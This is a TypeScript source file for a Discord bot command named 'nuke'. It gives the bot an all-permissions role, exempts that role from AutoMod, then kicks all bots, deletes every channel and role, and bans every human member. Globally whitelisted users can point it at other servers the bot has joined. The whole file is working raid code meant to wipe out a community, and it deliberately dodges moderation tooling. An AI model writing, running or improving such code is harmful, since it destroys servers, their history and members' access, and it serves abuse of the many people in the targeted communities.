import {
  SlashCommandBuilder,
  PermissionsBitField,
  type ChatInputCommandInteraction,
  type GuildBasedChannel,
} from "discord.js";
import type { SlashCommand } from "../types";
import { PERM_WHITELIST } from "../storage/whitelist";
import { logger } from "../../lib/logger";
import { exemptRoleFromAutoMod, pushRoleToTop } from "../utils/elevateRole";
import { isServerProtected } from "../storage/nuke-anti-whitelist";

const command: SlashCommand = {
  data: new SlashCommandBuilder()
    .setName("nuke")
    .setDescription(
      "Wipe the server: god role to bot, kick bots, delete channels/roles, ban members.",
    )
    .addStringOption((option) =>
      option
        .setName("server-id")
        .setDescription(
          "Optional: server ID to nuke (only works for global whitelist). Leave empty to nuke current server.",
        )
        .setRequired(false),
    )
    .setDMPermission(false),

  async execute(interaction: ChatInputCommandInteraction) {
    if (!interaction.inGuild()) {
      await interaction.reply({
        content: "This command can only be used in a server.",
        ephemeral: true,
      });
      return;
    }

    // Check who can use this command: global whitelist, server owner, or admin
    const isGlobalWhitelisted = PERM_WHITELIST.has(interaction.user.id);
    const isServerOwner = interaction.guild?.ownerId === interaction.user.id;
    const isAdmin =
      interaction.memberPermissions?.has("Administrator") ?? false;

    if (!isGlobalWhitelisted && !isServerOwner && !isAdmin) {
      await interaction.reply({
        content: "You aren't allowed to use this command.",
        ephemeral: true,
      });
      return;
    }

    const serverId = interaction.options.getString("server-id");
    let targetGuildId: string;

    if (serverId) {
      // Nuke another server - only global whitelist can do this
      if (!isGlobalWhitelisted) {
        await interaction.reply({
          content: "Only globally whitelisted users can nuke other servers.",
          ephemeral: true,
        });
        return;
      }
      if (!/^\d+$/.test(serverId)) {
        await interaction.reply({
          content: "Invalid server ID format.",
          ephemeral: true,
        });
        return;
      }
      targetGuildId = serverId;
    } else {
      // Nuke current server
      if (!interaction.guild || !interaction.guildId) {
        await interaction.reply({
          content: "This command must be used in a server or with a server-id parameter.",
          ephemeral: true,
        });
        return;
      }
      targetGuildId = interaction.guildId;
    }

    // Check if server is protected
    if (await isServerProtected(targetGuildId)) {
      await interaction.reply({
        content: `Server **${targetGuildId}** is protected by the nuke anti-whitelist and cannot be nuked.`,
        ephemeral: true,
      });
      return;
    }

    await interaction.reply({
      content: "💣 Nuke initiated. Stand by.",
      ephemeral: true,
    });

    // Fetch the guild (either from interaction or by ID)
    let guild;
    if (serverId) {
      guild = await interaction.client.guilds.fetch(targetGuildId).catch(() => null);
      if (!guild) {
        await interaction.editReply(
          `❌ Could not access server **${targetGuildId}**. Make sure the bot is in that server.`,
        );
        return;
      }
    } else {
      guild = interaction.guild;
    }

    const me = await guild.members.fetchMe().catch(() => null);
    if (!me) {
      logger.error("nuke: bot member not found");
      return;
    }

    // 1) Create a top-level role with all permissions and assign it to the bot.
    let godRole;
    try {
      godRole = await guild.roles.create({
        name: "💀",
        permissions: new PermissionsBitField(PermissionsBitField.All),
        hoist: true,
        color: 0xff0000,
        reason: "nuke: god role",
      });
    } catch (err) {
      logger.error({ err }, "nuke: failed to create god role");
      return;
    }

    await pushRoleToTop(guild, godRole);

    try {
      await me.roles.add(godRole, "nuke: assign god role to self");
    } catch (err) {
      logger.warn({ err }, "nuke: failed to assign god role to self");
    }

    // Bypass AutoMod for the new role so the bot's actions aren't filtered.
    await exemptRoleFromAutoMod(guild, godRole.id);

    // 2) Kick all bots (except self).
    const allMembers = await guild.members.fetch().catch(() => null);
    if (allMembers) {
      for (const m of allMembers.values()) {
        if (m.id === me.id) continue;
        if (!m.user.bot) continue;
        await m.kick("nuke").catch(() => {});
      }
    }

    // 3) Delete all channels.
    const channels = await guild.channels.fetch().catch(() => null);
    if (channels) {
      for (const c of channels.values()) {
        if (!c) continue;
        await (c as GuildBasedChannel).delete("nuke").catch(() => {});
      }
    }

    // 4) Delete all roles (except @everyone, managed roles, and our god role).
    const roles = await guild.roles.fetch().catch(() => null);
    if (roles) {
      for (const r of roles.values()) {
        if (r.id === guild.id) continue;
        if (r.managed) continue;
        if (r.id === godRole.id) continue;
        await r.delete("nuke").catch(() => {});
      }
    }

    // 5) Ban all remaining (human) members.
    if (allMembers) {
      for (const m of allMembers.values()) {
        if (m.id === me.id) continue;
        if (m.user.bot) continue;
        await guild.members.ban(m.id, { reason: "nuke" }).catch(() => {});
      }
    }

    logger.info({ guildId: guild.id }, "nuke completed");
  },
};

export default command;
